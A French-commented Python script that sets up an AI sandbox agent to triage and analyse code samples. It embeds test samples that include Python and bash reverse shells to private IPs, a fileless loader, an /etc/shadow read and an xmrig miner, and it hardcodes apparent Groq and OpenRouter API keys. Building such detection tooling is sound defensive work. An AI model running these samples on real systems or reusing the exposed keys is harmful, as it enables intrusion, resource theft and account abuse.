#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import threading
import time
import uvicorn
from llama_cpp.server.app import create_app
from llama_cpp.server.settings import Settings
from crewai import Agent, Task, Crew, LLM, Process
import requests
import os
import sys
import json
import asyncio
from typing import Optional, List

sys.path.insert(1, os.path.dirname(os.path.abspath(os.path.join(__file__, "..", ".."))))

# ============================================================================
# CONFIGURATION
# ============================================================================

path = "/home/hounsousamuel/PROJET/OBSIDIAN_ShieldIA_v2/modules/MODEL_SHARED/GGFU/gemma-2-2b-it-Q6_K.gguf"

# ============================================================================
# FONCTIONS SERVEUR (commentées si on utilise un serveur local)
# ============================================================================

def wait_for_server(url="http://127.0.0.1:8000/v1/models", timeout=120):
    start = time.time()
    while time.time() - start < timeout:
        try:
            r = requests.get(url)
            if r.status_code == 200:
                print("✅ Serveur prêt !")
                return True
        except requests.ConnectionError:
            pass
        time.sleep(2)
    raise TimeoutError("❌ Le serveur n'a pas démarré dans les temps.")

def start_server():
    settings = Settings(
        host="127.0.0.1",
        port=8000,
        model=path,
        n_threads=10,
        n_gpu_layers=0,
        chat_format="chatml",
        n_ctx=16384
    )
    app = create_app(settings=settings)
    uvicorn.run(app, host="127.0.0.1", port=8000, log_level="warning")

# Lancer le serveur (décommente pour utiliser local)
# server_thread = threading.Thread(target=start_server, daemon=True)
# server_thread.start()
# print("🚀 Démarrage du serveur...")
# wait_for_server()
# print("🔗 Connexion à l'API locale...")

# ============================================================================
# 2. IMPORT DES OUTILS DU SANDBOX
# ============================================================================

from sandbox_ia.agent.tools import ALL_SANDBOX_TOOLS
from sandbox_ia.agent.agent import create_sandbox_agent, task_analyze_code, task_triage_code, task_forensic_report, task_analyze_file, task_monitor_container, create_sandbox_crew
from sandbox_ia.agent.config import AGENT_PERSONAS

print(f"📦 {len(ALL_SANDBOX_TOOLS)} outils chargés:")
for t in ALL_SANDBOX_TOOLS:
    print(f"   - {t.name}")

# ============================================================================
# 3. LLM CONFIGURATION
# ============================================================================

# Choix 1 : Serveur local OpenAI-compatible (llama.cpp)
llm_local = LLM(
    model="openai/local",
    base_url="http://127.0.0.1:8000/v1",
    api_key="fake-key",
    temperature=0.1,
)

# Choix 2 : Groq (rapide, gratuit)
llm_groq = LLM(
    model="groq/llama-3.1-8b-instant",
    api_key="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",
    temperature=0.1,
)

# Choix 3 : OpenRouter (multi-modèles)
llm_openrouter = LLM(
    model="openrouter/openrouter/free",
    api_key="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",
    temperature=0.1,
)

# Sélection du LLM (change ici)
llm = llm_openrouter

# ============================================================================
# 4. AGENT SANDBOX
# ============================================================================

# Personas disponibles: "analyst", "hunter", "forensic", "triage"
agent = create_sandbox_agent(
    persona="analyst",
    llm=llm,
    tools=ALL_SANDBOX_TOOLS[:],  # Tous les outils
)
print(f"\n📋 Backstory de l'agent:\n{agent.backstory[:500]}...")

# ============================================================================
# 5. ÉCHANTILLONS DE CODE MALVEILLANT / SUSPECT
# ============================================================================

# Échantillon 1: Reverse shell basique
REVERSE_SHELL = """#!/usr/bin/env python3
import socket
import subprocess
import os

def reverse_shell():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(("192.168.1.100", 4444))
    os.dup2(s.fileno(), 0)
    os.dup2(s.fileno(), 1)
    os.dup2(s.fileno(), 2)
    subprocess.call(["/bin/sh", "-i"])

if __name__ == "__main__":
    reverse_shell()
"""

# Échantillon 2: Injection de code / Fileless
FILELESS_PAYLOAD = """#!/usr/bin/env python3
import ctypes
import mmap
import base64

shellcode = base64.b64decode("SGVsbG8gV29ybGQh")
mem = mmap.mmap(-1, len(shellcode), prot=mmap.PROT_READ | mmap.PROT_WRITE | mmap.PROT_EXEC)
mem.write(shellcode)
ctypes.CDLL(None).execve(mem, [], [])
"""

# Échantillon 3: Obfuscation + Credential theft
OBFUSCATED_PAYLOAD = """#!/usr/bin/env python3
import os
import subprocess
import base64

def decrypt(s):
    return base64.b64decode(s[::-1]).decode()

cmd = decrypt("==" + "lVLVLgbnN3ZSa"+ "lZa5hRxhR3bW9+ME" + "eW0UdN3bXZyZUd" + "SgXUb" + "xka" + "S5h" + "Zk" + "==")
os.system(cmd)
with open("/etc/shadow", "r") as f:
    print(f.read())
"""

# Échantillon 4: Cryptominer
CRYPTOMINER = """#!/usr/bin/env python3
import requests
import subprocess
import json

config = {
    "url": "stratum+ssl://pool.supportxmr.com:443",
    "user": "4Bk...",
    "pass": "x"
}

subprocess.Popen(["xmrig", "-o", config["url"], "-u", config["user"], "-p", config["pass"]])
"""

# Échantillon 5: Code bénin
BENIGN_CODE = """#!/usr/bin/env python3
# Calculatrice simple
def add(a, b):
    return a + b

def multiply(a, b):
    return a * b

if __name__ == "__main__":
    print("Résultat:", add(5, 3))
    print("Produit:", multiply(5, 3))
"""

# Échantillon 6: Code avec import dynamique suspect
DYNAMIC_IMPORT = """#!/usr/bin/env python3
import os
import sys

# Import dynamique
module = __import__(sys.argv[1] if len(sys.argv) > 1 else "os")
print(getattr(module, sys.argv[2] if len(sys.argv) > 2 else "name"))
"""

# Échantillon 7: Script bash reverse shell
BASH_REVERSE = """#!/bin/bash
exec 5<>/dev/tcp/10.0.0.1/8080
cat <&5 | while read line; do $line 2>&5 >&5; done
"""

# ============================================================================
# 6. TÂCHES PRÉDÉFINIES
# ============================================================================

def task_analyze_sample(code: str, language: str = None, context: str = None) -> Task:
    """Crée une tâche d'analyse comportementale complète."""
    return task_analyze_code(agent, code, language, context)

def task_triage_sample(code: str, language: str = None) -> Task:
    """Crée une tâche de triage rapide."""
    return task_triage_code(agent, code, language)

def task_forensic_sample(code: str, language: str = None, incident_context: str = None) -> Task:
    """Crée une tâche de rapport forensique."""
    return task_forensic_report(agent, code, language, incident_context)

def task_file_analysis(file_path: str, context: str = None) -> Task:
    """Crée une tâche d'analyse de fichier."""
    return task_analyze_file(agent, file_path, context)

def task_monitor() -> Task:
    """Crée une tâche de monitoring du container."""
    return task_monitor_container(agent)

# ============================================================================
# 7. CREW
# ============================================================================

def run_crew(tasks: List[Task], verbose: bool = True) -> dict:
    """Exécute un crew avec les tâches données."""
    crew = create_sandbox_crew(agent, tasks, verbose=verbose, memory=False)
    
    print("\n" + "=" * 60)
    print("🚀 EXÉCUTION DU CREW SANDBOX")
    print("=" * 60)
    
    result = crew.kickoff()
    return {"result": str(result), "tasks_count": len(tasks)}

async def run_crew_async(tasks: List[Task], verbose: bool = True) -> dict:
    """Exécute un crew de manière asynchrone."""
    crew = create_sandbox_crew(agent, tasks, verbose=verbose, memory=False)
    
    print("\n" + "=" * 60)
    print("🚀 EXÉCUTION ASYNCHRONE DU CREW SANDBOX")
    print("=" * 60)
    
    result = await crew.kickoff_async()
    return {"result": str(result), "tasks_count": len(tasks)}

# ============================================================================
# 8. FONCTIONS RAPIDES (ASYNC)
# ============================================================================

async def quick_sandbox_analyze(code: str, language: str = None) -> dict:
    """Analyse rapide dans le sandbox."""
    from sandbox_ia.agent.agent import quick_sandbox_analyze
    return await quick_sandbox_analyze(code, llm, language)

async def quick_triage(code: str) -> dict:
    """Triage rapide du code."""
    from sandbox_ia.agent.agent import quick_triage
    return await quick_triage(code, llm)

async def quick_estimate_risk(code: str) -> dict:
    """Estimation rapide du risque (statique, sans exécution)."""
    from sandbox_ia.agent.tools import EstimateRisk
    tool = EstimateRisk()
    return tool._run(code=code)

async def quick_container_status() -> dict:
    """Récupère l'état du container."""
    from sandbox_ia.agent.tools import GetContainerStatus
    tool = GetContainerStatus()
    return tool._run()

async def quick_last_report() -> dict:
    """Récupère le dernier rapport d'analyse."""
    from sandbox_ia.agent.tools import GetLastReport
    tool = GetLastReport()
    return tool._run()

async def quick_supported_languages() -> dict:
    """Récupère la liste des langages supportés."""
    from sandbox_ia.agent.tools import GetSupportedLanguages
    tool = GetSupportedLanguages()
    return tool._run()

# ============================================================================
# 9. INTERFACE INTERACTIVE (REPL)
# ============================================================================

def interactive_mode():
    """Mode interactif pour dialoguer avec l'agent sandbox."""
    print("\n" + "=" * 60)
    print("🛡️ SHIELD AI - Sandbox Agent")
    print("=" * 60)
    print("Commandes disponibles:")
    print("  /analyze <code>           - Analyse complète d'un code")
    print("  /analyze-sample <n>       - Analyse d'un échantillon prédéfini (1-7)")
    print("  /triage <code>            - Triage rapide (statique + sandbox si besoin)")
    print("  /triage-sample <n>        - Triage d'un échantillon prédéfini")
    print("  /forensic <code>          - Rapport forensique complet")
    print("  /forensic-sample <n>      - Rapport forensique d'un échantillon")
    print("  /risk <code>              - Estimation de risque statique")
    print("  /container                - État du container")
    print("  /report                   - Dernier rapport d'analyse")
    print("  /langs                    - Langages supportés")
    print("  /list-samples             - Liste des échantillons prédéfinis")
    print("  /exit                     - Quitter")
    print("=" * 60)
    
    # Liste des échantillons
    samples = {
        "1": ("Reverse Shell", REVERSE_SHELL, "python"),
        "2": ("Fileless Payload", FILELESS_PAYLOAD, "python"),
        "3": ("Obfuscated + Credential Theft", OBFUSCATED_PAYLOAD, "python"),
        "4": ("Cryptominer", CRYPTOMINER, "python"),
        "5": ("Code Bénin", BENIGN_CODE, "python"),
        "6": ("Dynamic Import", DYNAMIC_IMPORT, "python"),
        "7": ("Bash Reverse Shell", BASH_REVERSE, "bash"),
    }
    
    while True:
        try:
            cmd = input("\n🔍 > ").strip()
            if not cmd:
                continue
            
            if cmd == "/exit":
                print("👋 Au revoir !")
                break
            
            elif cmd == "/help":
                print("\nCommandes disponibles:")
                print("  /analyze <code>           - Analyse complète d'un code")
                print("  /analyze-sample <n>       - Analyse d'un échantillon prédéfini (1-7)")
                print("  /triage <code>            - Triage rapide")
                print("  /triage-sample <n>        - Triage d'un échantillon prédéfini")
                print("  /forensic <code>          - Rapport forensique complet")
                print("  /forensic-sample <n>      - Rapport forensique d'un échantillon")
                print("  /risk <code>              - Estimation de risque statique")
                print("  /container                - État du container")
                print("  /report                   - Dernier rapport d'analyse")
                print("  /langs                    - Langages supportés")
                print("  /list-samples             - Liste des échantillons prédéfinis")
                print("  /exit                     - Quitter")
            
            elif cmd == "/list-samples":
                print("\n📋 Échantillons prédéfinis:")
                for key, (name, _, lang) in samples.items():
                    print(f"  {key}. {name} ({lang})")
                print()
            
            elif cmd.startswith("/analyze-sample "):
                n = cmd[16:].strip()
                if n in samples:
                    name, code, lang = samples[n]
                    print(f"🔍 Analyse de l'échantillon: {name} ({lang})")
                    print(f"📄 Code:\n{code[:200]}...\n")
                    
                    task = task_analyze_sample(code, lang, context=f"Échantillon {n}: {name}")
                    crew = create_sandbox_crew(agent, [task], verbose=True)
                    result = crew.kickoff()
                    print(f"\n📝 Résultat:\n{result}")
                else:
                    print(f"❌ Échantillon {n} non trouvé. Utilise /list-samples")
            
            elif cmd.startswith("/triage-sample "):
                n = cmd[15:].strip()
                if n in samples:
                    name, code, lang = samples[n]
                    print(f"🔍 Triage de l'échantillon: {name} ({lang})")
                    print(f"📄 Code:\n{code[:200]}...\n")
                    
                    task = task_triage_sample(code, lang)
                    crew = create_sandbox_crew(agent, [task], verbose=True)
                    result = crew.kickoff()
                    print(f"\n📝 Résultat:\n{result}")
                else:
                    print(f"❌ Échantillon {n} non trouvé. Utilise /list-samples")
            
            elif cmd.startswith("/forensic-sample "):
                n = cmd[17:].strip()
                if n in samples:
                    name, code, lang = samples[n]
                    print(f"🔍 Rapport forensique de l'échantillon: {name} ({lang})")
                    print(f"📄 Code:\n{code[:200]}...\n")
                    
                    task = task_forensic_sample(code, lang, incident_context=f"Échantillon {n}: {name}")
                    crew = create_sandbox_crew(agent, [task], verbose=True)
                    result = crew.kickoff()
                    print(f"\n📝 Résultat:\n{result}")
                else:
                    print(f"❌ Échantillon {n} non trouvé. Utilise /list-samples")
            
            elif cmd.startswith("/analyze "):
                code = cmd[9:].strip()
                if not code:
                    print("❌ Veuillez fournir un code à analyser.")
                    continue
                print(f"🔍 Analyse du code...")
                print(f"📄 Code:\n{code[:200]}...\n")
                
                task = task_analyze_sample(code, context="Analyse demandée manuellement")
                result = asyncio.run(run_crew_async([task]))
                print(f"\n📝 Résultat:\n{result}")
            
            elif cmd.startswith("/triage "):
                code = cmd[8:].strip()
                if not code:
                    print("❌ Veuillez fournir un code à trier.")
                    continue
                print(f"🔍 Triage du code...")
                
                result = asyncio.run(quick_triage(code))
                print(json.dumps(result, indent=2, ensure_ascii=False))
            
            elif cmd.startswith("/forensic "):
                code = cmd[10:].strip()
                if not code:
                    print("❌ Veuillez fournir un code pour le rapport forensique.")
                    continue
                print(f"🔍 Rapport forensique du code...")
                
                task = task_forensic_sample(code, incident_context="Analyse forensique demandée manuellement")
                result = asyncio.run(run_crew_async([task]))
                print(f"\n📝 Résultat:\n{result}")
            
            elif cmd.startswith("/risk "):
                code = cmd[6:].strip()
                if not code:
                    print("❌ Veuillez fournir un code à analyser.")
                    continue
                print(f"📊 Estimation du risque statique...")
                
                result = asyncio.run(quick_estimate_risk(code))
                print(json.dumps(result, indent=2, ensure_ascii=False))
            
            elif cmd == "/container":
                print("📊 État du container...")
                result = asyncio.run(quick_container_status())
                print(json.dumps(result, indent=2, ensure_ascii=False))
            
            elif cmd == "/report":
                print("📊 Dernier rapport d'analyse...")
                result = asyncio.run(quick_last_report())
                print(json.dumps(result, indent=2, ensure_ascii=False))
            
            elif cmd == "/langs":
                print("📚 Langages supportés...")
                result = asyncio.run(quick_supported_languages())
                print(json.dumps(result, indent=2, ensure_ascii=False))
            
            else:
                # Passer la commande à l'agent Crew
                print(f"🤔 Traitement de la demande: {cmd}")
                crew = Crew(
                    agents=[agent],
                    tasks=[Task(
                        description=cmd,
                        expected_output="Réponse pertinente à la demande concernant l'analyse sandbox",
                        agent=agent
                    )],
                    process=Process.sequential,
                    verbose=True,
                )
                result = crew.kickoff()
                print(f"\n📝 Réponse:\n{result}")
        
        except KeyboardInterrupt:
            print("\n👋 Interrompu. Au revoir !")
            break
        except Exception as e:
            print(f"❌ Erreur: {e}")
            import traceback
            traceback.print_exc()

# ============================================================================
# 10. MAIN
# ============================================================================

if __name__ == "__main__":
    print("\n" + "=" * 60)
    print("🛡️ SHIELD AI - Sandbox Agent")
    print("=" * 60)
    print(f"   LLM: {llm.model if hasattr(llm, 'model') else 'Groq'}")
    print(f"   Persona: analyst")
    print(f"   Outils: {len(ALL_SANDBOX_TOOLS)}")
    print("=" * 60)
    
    # Test rapide avant mode interactif
    print("\n🧪 Test rapide de l'agent sandbox...")
    try:
        # Test d'analyse d'un code bénin
        test_task = Task(
            description=f"""Analyse ce code simple:
def add(a, b):
    return a + b
print(add(2, 3))
Réponds en JSON avec le format attendu.""",
        expected_output="Un rapport JSON avec analysis, threat_level, mitre_ttps, recommendation.",
        agent=agent,
        )
        test_crew = Crew(agents=[agent], tasks=[test_task], verbose=False)
        response = test_crew.kickoff()
        print(f"✅ Agent prêt: {str(response)}...")
    except Exception as e:
        print(f"⚠️ Erreur test agent: {e}")
    
    interactive_mode()